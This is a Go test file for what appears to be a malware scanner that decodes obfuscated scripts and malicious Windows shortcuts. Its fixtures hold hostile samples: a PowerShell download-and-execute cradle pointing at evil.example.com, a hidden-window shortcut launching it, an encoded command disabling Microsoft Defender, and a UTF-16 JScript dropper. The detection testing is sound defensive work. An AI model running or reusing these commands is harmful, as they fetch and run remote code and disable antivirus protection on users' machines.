package main

import (
	"encoding/base64"
	"encoding/binary"
	"strings"
	"testing"
	"unicode/utf16"
)

// --- shared decoder ---

func TestReverseString(t *testing.T) {
	if got := reverseString("abc"); got != "cba" {
		t.Fatalf("reverseString abc = %q", got)
	}
	// A reversed URL is re-oriented by reversing the whole buffer.
	reversed := "exe.p/moc.elpmaxe.live//:ptth"
	if got := reverseString(reversed); got != "http://evil.example.com/p.exe" {
		t.Fatalf("reverseString URL = %q", got)
	}
}

func TestDecodeTextDelimitedHex(t *testing.T) {
	// "powershell" encoded as separator-delimited hex pairs.
	plain := "powershell evil"
	var b strings.Builder
	seps := []byte{'}', 'h', 'g', 'l', '@', '!', '<', 'j'}
	for i := 0; i < len(plain); i++ {
		b.WriteString(byteHex(plain[i]))
		if i < len(plain)-1 {
			b.WriteByte(seps[i%len(seps)])
		}
	}
	got := decodeText(b.String())
	found := false
	for _, dv := range got {
		if dv.Encoding == "delimited-hex" && strings.Contains(dv.Value, "powershell evil") {
			found = true
		}
	}
	if !found {
		t.Fatalf("delimited-hex decode failed: %#v", got)
	}
}

func TestDecodeAllLayersNested(t *testing.T) {
	// base64( delimited-hex( "set-mppreference -disablerealtimemonitoring" ) )
	inner := "set-mppreference -disablerealtimemonitoring"
	var hexed strings.Builder
	for i := 0; i < len(inner); i++ {
		hexed.WriteString(byteHex(inner[i]))
		if i < len(inner)-1 {
			hexed.WriteByte('}')
		}
	}
	outer := base64.StdEncoding.EncodeToString([]byte(hexed.String()))
	layers := decodeAllLayers(outer, 3)
	joined := strings.ToLower(strings.Join(layers, "\n"))
	if !strings.Contains(joined, "set-mppreference") {
		t.Fatalf("expected nested decode to recover Defender command, got layers: %#v", layers)
	}
}

func byteHex(b byte) string {
	const hexdigits = "0123456789abcdef"
	return string([]byte{hexdigits[b>>4], hexdigits[b&0xf]})
}

// --- script analyzer ---

func TestScanScriptContentDefenderTampering(t *testing.T) {
	inner := "powershell Set-MpPreference -DisableRealtimeMonitoring $true"
	var hexed strings.Builder
	for i := 0; i < len(inner); i++ {
		hexed.WriteString(byteHex(inner[i]))
		if i < len(inner)-1 {
			hexed.WriteByte('}')
		}
	}
	content := `$kkk = "` + base64.StdEncoding.EncodeToString([]byte(hexed.String())) + `"`
	result := &ScanResult{FileType: "PowerShell script"}
	scanScriptContent(result, Config{Mode: "deep", MaxDecodeDepth: 3}, content, "script body")

	if !hasFindingTitle(result.Findings, "Microsoft Defender tampering") {
		t.Fatalf("expected Defender tampering finding, got: %s", findingTitles(result))
	}
	if !hasFindingTitle(result.Findings, "Heavily obfuscated script content") {
		t.Fatalf("expected obfuscation finding, got: %s", findingTitles(result))
	}
}

func TestScanScriptContentDownloadCradleAndReversedURL(t *testing.T) {
	reversed := "exe.p/moc.elpmaxe.live//:ptth" // http://evil.example.com/p.exe
	content := `$a='` + reversed + `'; (New-Object System.Net.WebClient).DownloadFile(-join $a[$a.Length..0],$g); Start-Process $g`
	result := &ScanResult{FileType: "PowerShell script"}
	scanScriptContent(result, Config{Mode: "deep", MaxDecodeDepth: 3}, content, "script body")

	if !hasFindingTitle(result.Findings, "Remote download-and-execute cradle") {
		t.Fatalf("expected download cradle finding, got: %s", findingTitles(result))
	}
	if !containsStringFold(result.IOCs.URLs, "http://evil.example.com/p.exe") {
		t.Fatalf("expected reversed URL to be recovered, got: %#v", result.IOCs.URLs)
	}
}

// --- LNK parser ---

func TestDetectAndAnalyzeMaliciousLNK(t *testing.T) {
	relPath := `..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
	args := `-w hidden -command $a='exe.p/moc.elpmaxe.live//:ptth'; (New-Object System.Net.WebClient).DownloadFile(-join $a[$a.Length..0],$g); Start-Process $g`
	data := buildLNK(relPath, args)

	if ft := DetectFileType(data, "evil.lnk"); ft != "Windows shortcut" {
		t.Fatalf("DetectFileType = %q, want Windows shortcut", ft)
	}

	result := &ScanResult{FileType: "Windows shortcut", Target: "evil.lnk"}
	if err := analyzeLNK(result, Config{Mode: "deep", MaxDecodeDepth: 3}, data); err != nil {
		t.Fatalf("analyzeLNK error: %v", err)
	}
	if !hasFindingTitle(result.Findings, "Shortcut launches a command interpreter") {
		t.Fatalf("expected LOLBin finding, got: %s", findingTitles(result))
	}
	if !hasFindingTitle(result.Findings, "Remote download-and-execute cradle") {
		t.Fatalf("expected cradle finding, got: %s", findingTitles(result))
	}
	if !containsStringFold(result.IOCs.URLs, "http://evil.example.com/p.exe") {
		t.Fatalf("expected recovered C2 URL, got: %#v", result.IOCs.URLs)
	}
}

func TestLooksLNKRejectsNonLNK(t *testing.T) {
	if looksLNK([]byte("MZ this is not a shortcut padding padding padding padding padding")) {
		t.Fatal("looksLNK should reject a non-LNK buffer")
	}
}

func TestUTF16ScriptDetectionAndDecode(t *testing.T) {
	body := `var u="http://evil.example.com/p.exe"; new ActiveXObject("WScript.Shell").Run(u);`
	// Encode as UTF-16LE with BOM (a common dropper encoding).
	u16 := utf16.Encode([]rune(body))
	data := []byte{0xFF, 0xFE}
	for _, c := range u16 {
		data = append(data, byte(c), byte(c>>8))
	}

	if ft := DetectFileType(data, "dropper.js"); ft != "JScript" {
		t.Fatalf("UTF-16 .js should be detected as JScript, got %q", ft)
	}
	if !looksUTF16Text(data) {
		t.Fatal("looksUTF16Text should recognize the BOM'd UTF-16 buffer")
	}
	decoded := scriptText(data)
	if !strings.Contains(decoded, "evil.example.com") {
		t.Fatalf("scriptText should decode UTF-16 to UTF-8, got: %q", decoded)
	}
}

// buildLNK builds a minimal unicode shell link with RelativePath + Arguments.
func buildLNK(relPath, args string) []byte {
	buf := make([]byte, 0x4C)
	binary.LittleEndian.PutUint32(buf[0:4], 0x4C)
	copy(buf[4:20], lnkCLSID)
	flags := uint32(lnkHasRelativePath | lnkHasArguments | lnkIsUnicode)
	binary.LittleEndian.PutUint32(buf[20:24], flags)

	writeBlock := func(s string) {
		u16 := utf16.Encode([]rune(s))
		var cnt [2]byte
		binary.LittleEndian.PutUint16(cnt[:], uint16(len(u16)))
		buf = append(buf, cnt[:]...)
		for _, c := range u16 {
			var pair [2]byte
			binary.LittleEndian.PutUint16(pair[:], c)
			buf = append(buf, pair[:]...)
		}
	}
	writeBlock(relPath)
	writeBlock(args)
	return buf
}

// --- helpers ---

func findingTitles(result *ScanResult) string {
	var titles []string
	for _, f := range result.Findings {
		titles = append(titles, f.Title)
	}
	return strings.Join(titles, " | ")
}
